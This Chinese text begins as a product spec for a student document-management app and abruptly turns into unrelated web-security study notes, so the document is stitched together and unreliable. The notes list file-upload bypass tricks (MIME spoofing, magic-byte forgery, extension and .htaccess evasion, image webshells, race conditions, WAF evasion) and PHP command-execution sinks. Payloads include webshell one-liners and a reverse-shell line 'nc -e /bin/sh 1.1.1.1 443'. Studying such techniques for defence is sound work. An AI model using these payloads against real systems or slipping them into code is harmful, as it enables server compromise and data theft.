大学生文档智能管理产品（DocControl）

1. 背景说明

1.1 市场与用户痛点

大学生在日常学习、科研、社团、求职中积累大量电子文档（课件、作业、论文、简历、证书等），但普遍存在以下问题：

  • 文件散乱：分散在手机相册、微信/QQ下载目录、邮箱附件、网盘，查找困难。
  • 命名无规范：容易出现“新建文档3.docx”、“作业（1）（1）.pdf“这种无规范命名。
  • 版本混乱：论文/作业反复修改，无法回溯旧版本，容易误覆盖。
  • 小组作业整合低效：成员各自负责部分，最终通过不同软件来回传、手动复制粘贴，耗时易错。

1.2 产品目标

设计一款面向大学生的C端文档智能管理App，利用AI能力提供：

  • 自动分类、智能命名、全文搜索
  • 个人文档版本管理（历史回溯）
  • 小组作业文件收集与自动整合

帮助大学生节省文档整理时间，提升学习与协作效率。

3.2 文件智能命名流程

说明：同样采用置信度阈值，高置信度自动执行，中置信度进入建议列表供用户确认/修改，低置信度留待用户手动处理。

文件上传

绕过

1. 前端限制绕过（JS 校验）

  • 原理：仅用 JavaScript 在浏览器端检查文件后缀、大小等，服务器不校验或只依赖前端传来的结果。
  • 具体操作：

    • 禁用浏览器 JS：在浏览器设置或开发者工具中禁用 JavaScript，或用插件 NoScript。

    • 直接发送，用 Burp Suite 抓包后修改后缀。

    • **修改 HTML/JS：在开发者工具中直接修改 **allow_ext 变量或删除 checkFile() 调用。

    • 直接提交请求：用 Burp Suite、Postman 等工具绕过页面，直接手动编写 HTTP 请求包构造请求，直接测试后端

如果上传错误文件时抓包工具抓到包，前端可以通过这份文件，但文件验证合法性在后端验证。删掉抓包数据中的 Content-Type 行，上传失败。可能是 👇

2. MIME / Content-Type 绕过

  • 原理：服务器检查 Content-Type 头是否为 image/jpeg、image/png 等，但可以伪造。
  • 具体操作：
    • 如抓包修改 Content-Type: application/x-php 为合法类型 Content-Type: image/png，服务器以为它是图片，允许存储。
    • 当服务器不仅检查上传文件的 MIME 类型（Content-Type: image/gif），还会读取文件内容的开头几个字节，来确认它是不是真正有正确文件格式时，攻击者就需要****伪造文件头
      在恶意文件的最开头，直接加上目标文件格式对应的文件头(GIF→ 可打印 ASCII 字符GIF89a 或 GIF87a | PNG→ 文件头包含不可打印字符，需要用二进制方式写入，f.write(b"\x89PNG\r\n\x1a\n“)** **字节标识、魔数、文件头

3. 后缀名黑名单绕过

  • 原理：只禁用部分危险后缀（如 .php、.asp），但遗漏了其他可解析后缀。
  • 具体操作（取决于服务器配置和语言）：
    • 同义后缀：.php2, .php3, .php4, .php5, .phtml, .phps, .asp, .aspx, .cer, .asa （若服务器并未以 php 方式解析 php3，（Apache)在环境配置文件中找到 httpd-conf 改 AddType))
    • 大小写：.pHp, .PhP（系统不区分大小写，黑名单没覆盖）
    • 双写：.phphpp -> 被替换掉 php 后成为 .php（如 shell.pphphp 可能绕过低级替换）
    • NTFS 流（Windows）：shell.php::$DATA 写上去会变成 shell.php
    • 空字节截断（PHP 版本 < 5.3.4）：shell.php%00.jpg，服务端取后缀时读到 %00 截断，得到 .jpg；但保存时文件名截断为 shell.php。或 0x00。
    • 末尾加点/空格：shell.php. 或 shell.php（Windows 会自动去掉点/空格，黑名单没覆盖）
    • .htaccess 绕过：修改文件解析规则（Apache 特有）
      1. SetHandler（强力覆盖）：强制特定文件类型作为 PHP 运行
      2. AddType（映射扩展名）：将特定扩展名映射为 PHP 类型
      3. FilesMatch> 配合 SetHandler：将指定文件强制作 PHP 解析（通常结合 \正则匹配文件名），如：

4. 文件内容检测绕过

  • 原理：服务器用 getimagesize()（PHP)、exif_imagetype()、Files.probeContentType(Java(Spring)）、python-magic 库、
    finfo 扩展

    判断是否为图片。 如果只检查前几个字节，可用伪造图片头的图片马。 然而，这些函数如getimagesize() 会尝试解析完整的结构、找到必须的图像数据快，能够识别出简单拼接但破坏了图片结构的文件，所以仅伪造图片头会被拦住，需要命令行拼接或中间注入的图片马。

  • 具体操作：

    • 命令行拼接：cat shell.php >> image.jpg（Linux） 或 copy /b image.jpg+shell.php shell.jpg（Windows）
    • 伪造图片头：GIF89a 开头，后面跟 <?php phpinfo(); ?>
    • 绕过 getimagesize()：在 PNG 的 IHDR 块之后插入 PHP 代码（需保证图像结构大致完整）
    • 二次渲染绕过：有些库会重新渲染图片，舍弃原始文件的非图像数据，导致恶意代码被抹掉；渲染过程并非完美复制，它只会改变图片的部分数据。所以需要用脚本在图片安全区位置（如注释块）插入代码

    最后，图片马需配合文件包含漏洞（常见函数 👇)或特定服务器配置才能触发执行

    • include()
    • include_once()
    • require()
    • require_once()

    这四个函数都会把指定的文件当作 PHP 代码来解析和执行，然后可以构造请求触发执行。

5.条件竞争

先上传，后检查

攻击者上传一个恶意脚本文件（如 shell.php）后， 服务器执行 move_uploaded_file()，将文件从临时目录移动到 Web 可访问的目录（如 /uploads/shell.php） **在服务器执行后续检查代码（如调用 unlink() 删除非法文件）之前，攻击者通过另一个并发请求（例如使用多线程脚本或 Burp Suite 的并发功能）**频繁访问 http://example.com/uploads/shell.php 如果攻击者的请求在 unlink() 执行之前到达 Web 服务器，那么该脚本文件就会被执行，从而触发 webshell 即使之后文件被删除，攻击者可能已经执行了任意命令或进一步植入持久后门

这个时间窗口通常非常短,但通过大量并发请求，攻击者可以提高命中概率

6. WAF/安全软件绕过

  • 原理：WAF 会检查请求包中的恶意特征（如 <?php, eval, system），通过变形、分块、混淆等方式让 WAF 识别不到，但后端 PHP 能解析。
  • 具体操作：
    • 换行绕过：<ph\np 在 HTTP 头里换行，某些 WAF 会放过，但后端 PHP 仍能解析（取决于版本）。
    • URL 编码混淆：%3C%3Fphp%20eval... 在某些解析器中会解码。
    • 分块传输（Chunked）：将 payload 分成多个小块，WAF 可能只检查第一块。
    • 利用 multipart/form-data 边界绕过：某些 WAF 解析畸形 boundary 出错。
    • 文件内容分段：<?php /* 注释 */ ?> 中间插入大量垃圾数据。
    • 大小写 / 部分检测：eVal, SyStEm。

预防

有效的防御需要组合多种措施： 采用 “白名单” 验证：只允许上传预设的安全文件类型（如 image/png, application/pdf），用黑名单禁止危险类型容易百密一疏

二次校验：

  • 检查文件扩展名。
  • 检查文件 MIME 类型。
  • 对图片文件，使用函数重新生成内容（这样会破坏任何隐藏的代码）。
  • 文件重命名：上传到服务器后，将文件重命名为随机的字符串（如 20250315_abc123.jpg），并去除原始文件名。
  • 分离存储与执行环境：将上传的文件存储在没有脚本执行权限的独立目录中，或者使用专门的、与主应用隔离的静态文件服务器。
  • 设置文件大小限制：防止通过超大文件进行拒绝服务攻击。
  • 部署 Web 应用防火墙（WAF）：作为一道额外的防线，拦截常见的恶意上传流量。

命令执行

对象：操作系统命令

攻击者通过漏洞，让目标系统执行未授权的命令，最终达到控制目标、窃取数据等目的

  1. 危险的系统命令执行函数，例如 PHP 的 system()、exec()、shell_exec() 、passthru()、popen()或 Python 的 os.system()
  2. 输入的数据未被妥善隔离，而是被直接作为命令的一部分，拼接到待执行的命令字符串中
  3. 未对特殊字符（如管道符 |、分号 ;、命令分隔符）进行转义或过滤，导致恶意指令被成功注入

PHP 命令执行核心函数

函数名 核心功能 安全风险说明 典型利用场景
system() 执行外部命令，并直接输出结果 直接执行系统命令，参数可控时可直接执行任意命令 system($_GET['cmd']); 直接 RCE
exec() 执行外部命令，返回结果最后一行 可通过第二个参数获取完整输出，参数可控即 RCE exec("ping ".$_GET['ip']); 命令拼接注入
shell_exec() 执行外部命令，以字符串返回全部输出 等价于反引号 ```，参数可控直接 RCE $output = shell_exec("ls ".$_GET['dir']);
passthru() 执行外部命令，原样输出二进制结果 常用于执行带输出的命令（如反弹 shell），参数可控即 RCE passthru("nc -e /bin/sh 1.1.1.1 443");
popen() 打开进程管道，执行命令并返回文件指针 可通过管道读写命令输出，参数可控即 RCE $handle = popen("id", "r");
proc_open() 执行命令并创建进程管道，支持更复杂的 IO 控制 功能极强，参数可控可实现任意命令执行、管道通信 复杂命令执行、无回显 RCE
pcntl_exec() 在当前进程空间执行指定程序 需 pcntl 扩展，参数可控可执行任意程序 Linux 环境下的命令执行
```（反引号） 执行反引号内的系统命令，返回输出 语法糖（更简洁的写法），等价于shell_exec()，极易被忽略 $output = whoami;
eval() 把字符串作为 PHP 代码执行 代码执行（非系统命令），参数可控可执行任意 PHP 代码 eval($_GET['code']); 一句话木马

array_map() 将自定义函数作用到数组每个元素 可传入危险函数（如system）实现批量命令执行 array_map("system", array("id", "whoami"));
preg_replace() 正则搜索替换 PHP < 5.5 中使用/e修饰符时，会执行替换字符串中的 PHP 代码 preg_replace("/test/e", $_GET['code'], "test");

代码执行

对象：编程语言代码

「任意代码执行 (Arbitrary Code Execution,ACE)」 是指攻击者在目标计算机或目标进程中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层面的脚本或程序，也包括应用程序内部的函数或方法调用。
在此基础上我们将通过网络触发任意代码执行的能力通常称为 「远程代码执行 (RCE,Remote Code Execution,RCE)」。

程序错误地将不可信的用户输入当作“合法代码”执行，导致攻击者能够注入并运行恶意代码

  1. 存在可执行动态代码的危险函数，例如PHP的eval()、assert()或Python的exec()
  2. 用户的输入数据未被净化，直接进入了代码执行流程，成为了执行代码的一部分
  3. 程序未对用户输入进行严格的检查、转义或过滤，允许包含恶意代码的负载注入

常见：

函数名 功能与安全风险说明
assert() 检查一个断言是否为 FALSE，旧版本中可执行代码，存在安全隐患。
call_user_func() 把第一个参数作为回调函数调用，若参数可控则可能导致代码注入。
array_map() 将用户自定义函数作用到数组中的每个值上，滥用可能导致批量执行。
preg_replace() 执行正则表达式搜索和替换，当使用 /e 修饰符时允许代码执行。
